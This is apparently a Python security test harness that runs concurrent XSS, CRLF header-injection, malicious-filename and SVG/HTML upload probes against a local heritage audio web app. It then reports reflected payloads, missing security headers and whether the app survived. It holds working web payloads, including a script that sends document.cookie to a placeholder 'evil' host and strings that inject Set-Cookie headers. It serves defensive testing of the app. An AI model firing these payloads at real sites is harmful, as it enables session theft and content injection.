import argparse
import secrets
import sys
import threading
import time
import wave
import io
import math

import httpx

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<a href=\"javascript:alert(1)\">x</a>",
    "><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "jaVasCript:/*-/*`/*`/*'/*\"/**/(alert(1))//",
    "<math><mtext><table><mglyph><style><!--</style><img title=--></mglyph><img src=1 onerror=alert(1)>-->",
    "<details open ontoggle=alert(1)>",
    "{{7*7}}${7*7}<%= 7*7 %>",
    "<script>fetch('http://evil/'+document.cookie)</script>",
]

HTML_MARKERS = ("<script", "onerror=", "onload=", "javascript:", "<svg", "<iframe")


def make_wav(size=2048):
    buf = io.BytesIO()
    with wave.open(buf, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(8000)
        w.writeframes(b"".join(int(9000 * math.sin(i * 0.06)).to_bytes(2, "little", signed=True) for i in range(size // 2)))
    return buf.getvalue()


class Raid:
    def __init__(self):
        self.lock = threading.Lock()
        self.hits = []
        self.counts = {}
        self.statuses = {}

    def record(self, cls, status):
        with self.lock:
            self.counts[cls] = self.counts.get(cls, 0) + 1
            self.statuses[status] = self.statuses.get(status, 0) + 1

    def hit(self, cls, detail):
        with self.lock:
            self.hits.append((cls, detail[:200]))

    def check_response(self, cls, r, sent_payload):
        ct = r.headers.get("content-type", "")
        if r.status_code == 503:
            return
        if r.status_code >= 500 and r.status_code != 503:
            self.hit(cls, f"status {r.status_code}: {r.text[:120]}")
            return
        if "text/html" in ct:
            low = r.text[:4000].lower()
            for marker in HTML_MARKERS:
                if marker in low and sent_payload[:20].lower() in low:
                    self.hit(cls, f"XSS PHAN XA trong text/html: marker '{marker}' — payload {sent_payload[:60]}")
                    return
        if "\r\n" in sent_payload:
            for hk, hv in r.headers.items():
                if sent_payload[:24] in hv and hk.lower() not in ("date", "server", "content-length"):
                    self.hit(cls, f"CRLF LOI VAO HEADER {hk}: {hv[:100]}")


def upload_one(client, base, token, filename, title, artist, desc, lyrics, payload_tag, raid):
    data = make_wav()
    try:
        r = client.post(
            f"{base}/api/heritage/upload",
            files={"file": (filename, data, "audio/wav")},
            data={"title": title, "type": "hue", "artist": artist, "description": desc, "lyrics": lyrics},
            headers={"Authorization": f"Bearer {token}"},
            timeout=20,
        )
    except Exception as e:
        raid.record(payload_tag, 0)
        return None
    raid.record(payload_tag, r.status_code)
    if r.status_code >= 500 and r.status_code != 503:
        raid.hit(payload_tag, f"upload 500: {r.text[:120]}")
        return None
    try:
        return r.json().get("id")
    except Exception:
        return None


def persona_stored_metadata(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    i = 0
    while not stop.is_set():
        p = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
        i += 1
        tag = secrets.token_hex(3)
        item_id = upload_one(client, base, ta, f"xss_meta_{tag}.wav", p, p, p, p, "stored-metadata", raid)
        if item_id:
            r = client.get(f"{base}/api/heritage/{item_id}", timeout=15)
            raid.check_response("stored-metadata", r, p)
            ct = r.headers.get("content-type", "")
            if "text/html" in ct:
                raid.hit("stored-metadata", f"detail tra ve text/html thay vi JSON: {ct[:80]}")
        time.sleep(0.2)
    client.close()


def persona_reflected_search(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    i = 0
    while not stop.is_set():
        p = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
        i += 1
        for path in ("/api/heritage", "/api/lessons"):
            try:
                r = client.get(f"{base}{path}", params={"q": p, "limit": 3}, timeout=15)
            except Exception:
                raid.record("reflected-search", 0)
                continue
            raid.record("reflected-search", r.status_code)
            raid.check_response("reflected-search", r, p)
        time.sleep(0.1)
    client.close()


def persona_stored_username(raid, base, ta, stop, invite="CHAOS-CODE"):
    client = httpx.Client(timeout=20)
    i = 0
    while not stop.is_set():
        p = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
        i += 1
        u = ("xss" + secrets.token_hex(3))
        try:
            r = client.post(f"{base}/api/auth/register", json={
                "username": p[:40], "email": f"{u}@gmail.com",
                "password": "secret123", "invite_code": invite,
            }, timeout=15)
        except Exception:
            raid.record("stored-username", 0)
            continue
        raid.record("stored-username", r.status_code)
        if r.status_code == 200 and r.json().get("role") == "admin":
            raid.hit("stored-username", "ROLE ESCALATION qua username XSS")
        raid.check_response("stored-username", r, p)
        if r.status_code == 429:
            time.sleep(3)
        time.sleep(0.15)
    client.close()


def persona_svg_html_upload(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    exts = [".svg", ".html", ".htm", ".xhtml", ".shtml"]
    i = 0
    while not stop.is_set():
        ext = exts[i % len(exts)]
        i += 1
        evil = b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/><script>alert(1)</script>"
        try:
            r = client.post(
                f"{base}/api/heritage/upload",
                files={"file": (f"evil{ext}", evil, "image/svg+xml")},
                data={"title": f"evil{ext}"},
                headers={"Authorization": f"Bearer {ta}"},
                timeout=15,
            )
        except Exception:
            raid.record("svg-html-upload", 0)
            continue
        raid.record("svg-html-upload", r.status_code)
        if r.status_code == 200:
            raid.hit("svg-html-upload", f"SERVER NHAN file {ext} chua script — stored XSS file! id={r.text[:80]}")
        time.sleep(0.25)
    client.close()


def persona_polyglot_filename(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    names = [
        '"><img src=x onerror=alert(1)>.wav',
        "javascript:alert(1).wav",
        "x\r\nSet-Cookie: pwned=1\r\n.wav",
        "<script>alert(1)</script>.wav",
    ]
    i = 0
    while not stop.is_set():
        name = names[i % len(names)]
        i += 1
        item_id = upload_one(client, base, ta, name, "polyglot", "poly", "poly", "poly", "polyglot-filename", raid)
        if item_id:
            r = client.get(f"{base}/api/heritage/{item_id}", timeout=15)
            try:
                stored_name = r.json().get("filename", "")
                raw_name = r.json().get("original_name", "")
                joined = f"{stored_name}{raw_name}"
                if "<script" in joined.lower() or "onerror" in joined.lower():
                    raid.hit("polyglot-filename", f"ten file XSS duoc luu va tra ve: {joined[:100]}")
            except Exception:
                pass
            r2 = client.get(f"{base}/api/heritage/{item_id}/audio", timeout=15)
            cd = r2.headers.get("content-disposition", "")
            if "pwned=1" in cd or "\r\n" in cd:
                raid.hit("polyglot-filename", f"CRLF/COOKIE injection trong Content-Disposition: {cd[:120]}")
        time.sleep(0.3)
    client.close()


def persona_crlf(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    payloads = ["x%0d%0aSet-Cookie:%20pwned=1", "x\r\nX-Injected: 1", "a\r\n\r\n<script>alert(1)</script>"]
    i = 0
    while not stop.is_set():
        p = payloads[i % len(payloads)]
        i += 1
        try:
            r = client.get(f"{base}/api/heritage", params={"q": p, "limit": 2}, timeout=15)
        except Exception:
            raid.record("crlf-injection", 0)
            continue
        raid.record("crlf-injection", r.status_code)
        flat = "\r\n".join(f"{k}: {v}" for k, v in r.headers.items())
        if "pwned=1" in flat or "X-Injected" in flat:
            raid.hit("crlf-injection", f"HEADER INJECTION thanhf cong: {flat[:160]}")
        time.sleep(0.15)
    client.close()


def persona_content_type(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    while not stop.is_set():
        try:
            r = client.get(f"{base}/api/heritage", params={"limit": 5}, timeout=15)
            ct = r.headers.get("content-type", "")
            if "application/json" not in ct:
                raid.hit("content-type-probe", f"API JSON khong dung content-type: {ct[:80]}")
            if not r.headers.get("x-content-type-options"):
                raid.hit("content-type-probe", "THIEU X-Content-Type-Options: nosniff")
            raid.record("content-type-probe", r.status_code)
            r2 = client.get(f"{base}/", timeout=15)
            ct2 = r2.headers.get("content-type", "")
            if "text/html" in ct2 and not r2.headers.get("x-content-type-options"):
                raid.hit("content-type-probe", "WEB / thieu nosniff")
            raid.record("content-type-probe", r2.status_code)
        except Exception:
            raid.record("content-type-probe", 0)
        time.sleep(0.5)
    client.close()


def persona_error_reflection(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    while not stop.is_set():
        p = XSS_PAYLOADS[secrets.randbelow(len(XSS_PAYLOADS))]
        try:
            r = client.get(f"{base}/api/heritage/{p[:60]}", timeout=15)
            raid.record("error-reflection", r.status_code)
            ct = r.headers.get("content-type", "")
            if "text/html" in ct and "<script" in r.text[:2000].lower():
                raid.hit("error-reflection", f"404 page phan xa XSS: {r.text[:100]}")
            r2 = client.post(f"{base}/api/auth/login", json={"identifier": p[:40], "password": "x"}, timeout=15)
            raid.record("error-reflection", r2.status_code)
            if r2.status_code >= 500 and r2.status_code != 503:
                raid.hit("error-reflection", f"login 500 voi payload: {r2.text[:100]}")
        except Exception:
            raid.record("error-reflection", 0)
        time.sleep(0.2)
    client.close()


def persona_csp_observer(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    while not stop.is_set():
        try:
            r = client.get(f"{base}/", timeout=15)
            raid.record("csp-observer", r.status_code)
            if not r.headers.get("content-security-policy"):
                raid.hit("csp-observer", "THIEU Content-Security-Policy tren web / (hardening gap)")
        except Exception:
            raid.record("csp-observer", 0)
        time.sleep(1.0)
    client.close()


def persona_audio_serve(raid, base, ta, stop):
    client = httpx.Client(timeout=20)
    while not stop.is_set():
        try:
            r = client.get(f"{base}/api/heritage", params={"limit": 10}, headers={"Authorization": f"Bearer {ta}"}, timeout=15)
            items = r.json().get("items", []) if r.status_code == 200 else []
            if items:
                iid = items[secrets.randbelow(len(items))]["id"]
                r2 = client.get(f"{base}/api/heritage/{iid}/audio", timeout=20)
                raid.record("audio-serve", r2.status_code)
                ct = r2.headers.get("content-type", "")
                if "text/html" in ct:
                    raid.hit("audio-serve", f"audio tra ve text/html: {ct[:80]}")
                if not r2.headers.get("x-content-type-options"):
                    raid.hit("audio-serve", "audio download thieu nosniff")
        except Exception:
            raid.record("audio-serve", 0)
        time.sleep(0.3)
    client.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:8003")
    ap.add_argument("--seconds", type=int, default=60)
    ap.add_argument("--invite", default="CHAOS-CODE")
    ap.add_argument("--admin-password", default="")
    ap.add_argument("--no-integrity", action="store_true")
    args = ap.parse_args()
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass

    base = args.base
    raid = Raid()
    print(f"XSS RAID 10 persona dong thoi trong {args.seconds}s — target {base}")
    assert httpx.get(base + "/health", timeout=10).status_code == 200, "server khong san sang"

    c = httpx.Client(timeout=15)
    r = c.post(f"{base}/api/auth/login", json={"identifier": "ghitatruongle", "password": args.admin_password}, timeout=10)
    assert r.status_code == 200, "can admin password dung de upload"
    ta = r.json()["token"]
    c.close()

    stop = threading.Event()
    personas = [
        ("stored-metadata", persona_stored_metadata, ()),
        ("reflected-search", persona_reflected_search, ()),
        ("stored-username", persona_stored_username, (args.invite,)),
        ("svg-html-upload", persona_svg_html_upload, ()),
        ("polyglot-filename", persona_polyglot_filename, ()),
        ("crlf-injection", persona_crlf, ()),
        ("content-type-probe", persona_content_type, ()),
        ("error-reflection", persona_error_reflection, ()),
        ("csp-observer", persona_csp_observer, ()),
        ("audio-serve", persona_audio_serve, ()),
    ]
    threads = []
    for name, fn, extra in personas:
        th = threading.Thread(target=fn, args=(raid, base, ta, stop, *extra), daemon=True)
        threads.append(th)
    for th in threads:
        th.start()
    t0 = time.time()
    while time.time() - t0 < args.seconds:
        time.sleep(2)
    stop.set()
    for th in threads:
        th.join(timeout=20)

    print(f"\n== TONG KET {int(time.time() - t0)}s ==")
    total = 0
    for name, _, _ in personas:
        n = raid.counts.get(name, 0)
        total += n
        hits = sum(1 for cn, _ in raid.hits if cn == name)
        print(f"  {name:<20} requests={n:<7} hits={hits}")
    print(f"  phan bo status: {dict(sorted(raid.statuses.items()))}")
    print(f"  TONG requests={total} | HITS={len(raid.hits)}")
    for cn, d in raid.hits[:14]:
        print(f"  !!! [{cn}] {d}")

    if args.no_integrity:
        print("bo qua integrity (orchestrator tu lam phan xanh)")
        sys.exit(0)
    integrity_fails = []
    at = ""
    for _ in range(15):
        try:
            r = httpx.post(f"{base}/api/auth/login", json={"identifier": "ghitatruongle", "password": args.admin_password}, timeout=10)
        except Exception:
            r = None
        if r is not None and r.status_code == 200:
            at = r.json()["token"]
            break
        if r is not None and r.status_code == 429:
            time.sleep(8)
            continue
        break
    if not at:
        integrity_fails.append(f"admin khong dang nhap lai duoc (cuoi cung {r.status_code if r is not None else 'exc'})")
    else:
        r = httpx.get(f"{base}/api/heritage", params={"limit": 3}, headers={"Authorization": f"Bearer {at}"}, timeout=10)
        if r.status_code != 200:
            integrity_fails.append(f"heritage list {r.status_code}")
    if integrity_fails:
        print("  !!! " + " | ".join(integrity_fails))
        raid.hits.append(("integrity", "; ".join(integrity_fails)))
    else:
        print("  toan ven: admin dang nhap lai OK, API song")

    ok = len(raid.hits) == 0
    print(f"\nVERDICT XSS-RAID: {'CLEAN — KHONG CO LO HONG' if ok else 'CO PHAT HIEN'} | requests={total} | hits={len(raid.hits)}")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
